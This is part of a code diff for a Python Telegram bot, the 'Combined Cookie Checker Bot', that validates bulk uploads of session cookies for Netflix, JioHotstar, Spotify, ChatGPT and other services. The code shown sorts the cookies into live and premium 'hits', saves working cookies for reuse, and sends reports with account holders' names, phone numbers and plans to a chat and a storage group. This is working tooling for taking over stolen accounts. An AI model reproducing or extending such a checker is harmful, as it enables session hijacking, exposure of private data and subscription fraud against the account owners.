+                with open(os.path.join("hs_live", f"live_{result.get('name','unk')}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(hs_convert_to_netscape(result.get("cookies", {})))
+            elif status == "DEVICE_LIMIT":
+                dev_hit_n += 1; result["hit_num"] = dev_hit_n
+                device_list.append(result)
+                with open(os.path.join("hs_device", f"device_{result.get('name','unk')}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(hs_convert_to_netscape(result.get("cookies", {})))
+            elif status == "FREE":
+                free_list.append(result)
+                with open(os.path.join("hs_free", f"free_{result.get('name','unk')}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(hs_convert_to_netscape(result.get("cookies", {})))
+            else:
+                inv_list.append(result)
+
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, hs_fmt_progress(
+                        int(processed), total, len(live_list), len(device_list),
+                        len(free_list), len(inv_list), hs_plan_breakdown(live_list),
+                    ))
+
+    user_results[uid].update({
+        "hs_live": live_list, "hs_device": device_list,
+        "hs_free": free_list, "hs_invalid": inv_list,
+        "hs_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (live_list or device_list or free_list or inv_list)[0]
+        await safe_edit(status_msg, hs_fmt_single(only), markup=main_markup("hotstar"))
+        if only.get("status") != "INVALID" and GC_STORE_CHAT_ID:
+            await _gc_store_hs(bot, live_list, device_list, free_list)
+    else:
+        await safe_edit(status_msg,
+            hs_fmt_summary(total, len(live_list), len(device_list), len(free_list), len(inv_list),
+                           hs_plan_breakdown(live_list)),
+            markup=main_markup("hotstar"),
+        )
+        all_hits = [("LIVE", r) for r in live_list] + [("DEVICE_LIMIT", r) for r in device_list]
+        if all_hits:
+            ts_str  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            divider = "═" * 50
+            lines   = ["JioHotstar Bulk Check — Hit Report", divider,
+                       f"Generated  : {ts_str}", f"Live : {len(live_list)}", f"Device Limit : {len(device_list)}",
+                       divider, ""]
+            for idx, (kind, res) in enumerate(all_hits, 1):
+                tag = "LIVE" if kind == "LIVE" else "DEVICE LIMIT"
+                lines += [f"HIT #{idx:03d} — {tag}",
+                          f"  Name   : {res.get('name','?')}",
+                          f"  Phone  : {res.get('phone','?')}",
+                          f"  Plan   : {res.get('plan','?')}",
+                          f"  Expiry : {res.get('expiry','?')}"]
+                if kind == "LIVE":
+                    lines += [f"  Days   : {res.get('days_left','?')} days", f"  Ads    : {res.get('show_ads','?')}"]
+                lines += [f"  File   : {res.get('filename','?')}", ""]
+            lines.append(divider)
+            data = "\n".join(lines).encode()
+            await bot.send_document(
+                chat_id,
+                document=BufferedInputFile(data, filename=f"hs_hits_{datetime.now():%Y%m%d_%H%M%S}.txt"),
+                caption=f"📄 <b>Hotstar Hit Report</b> — {len(all_hits)} hit(s)\n"
+                        f"🟢 Live: <b>{len(live_list)}</b>  ⚠️ Device Limit: <b>{len(device_list)}</b>",
+                parse_mode="HTML",
+            )
+        if GC_STORE_CHAT_ID and (live_list or device_list or free_list):
+            await _gc_store_hs(bot, live_list, device_list, free_list)
+
+
+async def _run_netflix(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    sub        = user_results[uid].get("nf_sub", "check")
+    premium    = []; free_list = []; dead_list = []; token_list = []
+    processed  = last_edit = 0.0; hit_n = 0
+    loop       = asyncio.get_event_loop()
+    start_t    = time.monotonic()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, nf_check_file, fp, sub) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
+
+            status = result.get("status", "DEAD")
+            if status == "PREMIUM":
+                hit_n += 1; result["hit_num"] = hit_n
+                premium.append(result)
+                with open(os.path.join("nf_premium", f"prem_{hit_n}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(result.get("content", ""))
+                await bot.send_message(chat_id, nf_fmt_premium(result), parse_mode="HTML")
+            elif status == "FREE":
+                free_list.append(result)
+                with open(os.path.join("nf_free", f"free_{len(free_list)}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(result.get("content", ""))
+            elif status == "TOKEN":
+                hit_n += 1; result["hit_num"] = hit_n
+                token_list.append(result)
+                with open(os.path.join("nf_tokens", f"token_{hit_n}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(nf_build_token_export(result, hit_n))
+                await bot.send_message(chat_id, nf_fmt_token(result), parse_mode="HTML")
+            else:
+                dead_list.append(result)
+                with open(os.path.join("nf_dead", f"dead_{len(dead_list)}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(result.get("reason", ""))
+
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, nf_fmt_progress(
+                        int(processed), total, len(premium) + len(token_list),
+                        len(free_list), len(dead_list), sub,
+                    ))
+
+    elapsed = time.monotonic() - start_t
+    user_results[uid].update({
+        "nf_premium": premium, "nf_free": free_list,
+        "nf_dead": dead_list, "nf_tokens": token_list,
+        "nf_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (premium or token_list or free_list or dead_list)[0]
+        if only.get("status") == "PREMIUM":
+            await safe_edit(status_msg, nf_fmt_premium(only), markup=main_markup("netflix"))
+        elif only.get("status") == "TOKEN":
+            await safe_edit(status_msg, nf_fmt_token(only), markup=main_markup("netflix"))
+        elif only.get("status") == "FREE":
+            await safe_edit(status_msg, nf_fmt_free(only), markup=main_markup("netflix"))
+        else:
+            await safe_edit(status_msg, nf_fmt_dead(only), markup=main_markup("netflix"))
+    else:
+        hits = len(premium) + len(token_list)
+        await safe_edit(status_msg,
+            nf_fmt_summary(hits, len(free_list), len(dead_list), total, elapsed, sub),
+            markup=main_markup("netflix"))
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                                 MAIN                                   ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+async def main():
+    print("=" * 60)
+    print("  🔒 Combined Cookie Checker Bot v2")
+    print("     Surfshark · Spotify · JioHotstar · Netflix · HBO Max")
+    print("     ChatGPT · Cursor · Instagram · Cookie Scanner")
+    print("=" * 60)
+    print(f"  Token   : {TOKEN[:12]}...")
+    print(f"  Owner   : {OWNER_ID}")
+    print(f"  Workers : {MAX_WORKERS}")
+    print(f"  GC Store: {GC_STORE_CHAT_ID or 'Disabled'}")
+    print("=" * 60)
+    print("  ✅ Bot is running — press Ctrl+C to stop")
+    print("=" * 60)
+
+    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+    dp  = Dispatcher()
+    dp.include_router(router)
+
+    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
+# ══════════════════════════ END OF CHUNK 5 ══════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#  END OF FILE — new.py complete (5/5 chunks concatenated)
+# ═══════════════════════════════════════════════════════════════════
